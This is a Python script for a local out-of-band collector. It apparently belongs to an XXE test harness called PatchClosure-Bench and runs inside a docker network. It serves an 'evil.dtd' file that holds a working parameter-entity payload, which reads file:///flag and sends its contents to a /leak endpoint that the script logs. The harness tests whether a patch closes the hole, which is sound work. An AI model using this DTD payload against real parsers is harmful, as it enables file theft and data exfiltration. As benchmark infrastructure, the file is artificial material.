#!/usr/bin/env python3
"""Benign, local-only OOB collector for the PatchClosure-Bench XXE canary.

Runs INSIDE the docker-compose network (alias 'collector'). It has three jobs:

  1. Accept a raw TCP connection on :8000 so the VelbusTCPAgent's protocol
     instance can start (the Velbus TCP protocol throws on connect failure, so
     the agent needs *some* listening endpoint before its import path becomes
     reachable). Any TCP accept is enough; we happen to speak HTTP.

  2. Serve GET /evil.dtd -- an external DTD that defines an OOB parameter-entity
     exfil chain. When a vulnerable Saxon/StAX parser fetches it while resolving
     <!DOCTYPE KNX SYSTEM "http://collector:8000/evil.dtd">, it reads
     file:///flag and beacons the contents to /leak.

  3. Log every GET /leak?f=... hit to /log/hits.txt and expose it over
     GET /hits so the host-side oracle can observe the exfil without docker exec.
     GET /reset clears the log between vectors.

Nothing ever leaves the local docker network. file:///flag is a per-run canary
token planted at build time; the collector only records that the token was read.
"""
import http.server, socketserver, urllib.parse, os

# Host:port the leaked flag beacons back to (must match how the manager reaches
# this collector on the internal network so the constructed URI is well-formed).
HOST = os.environ.get("COLLECTOR_HOST", "collector:8000")

DTD = (
    '<!ENTITY %% file SYSTEM "file:///flag">\n'
    '<!ENTITY %% eval "<!ENTITY &#x25; exfil SYSTEM \'http://%s/leak?f=%%file;\'>">\n'
    '%%eval;\n'
    '%%exfil;\n'
) % HOST

os.makedirs("/log", exist_ok=True)
open("/log/hits.txt", "a").close()


class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _send(self, code, body=b"", ctype="text/plain"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if body:
            self.wfile.write(body)

    def do_GET(self):
        p = urllib.parse.urlparse(self.path)
        if p.path == "/evil.dtd":
            self._send(200, DTD.encode(), "application/xml-dtd")
        elif p.path == "/leak":
            with open("/log/hits.txt", "a") as f:
                f.write("LEAK " + p.query + "\n")
            self._send(200, b"ok")
        elif p.path == "/hits":
            with open("/log/hits.txt") as f:
                self._send(200, f.read().encode())
        elif p.path == "/reset":
            open("/log/hits.txt", "w").close()
            self._send(200, b"reset")
        else:
            self._send(404)


class T(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


with T(("0.0.0.0", 8000), H) as httpd:
    print("collector listening on 8000, exfil host=" + HOST, flush=True)
    httpd.serve_forever()
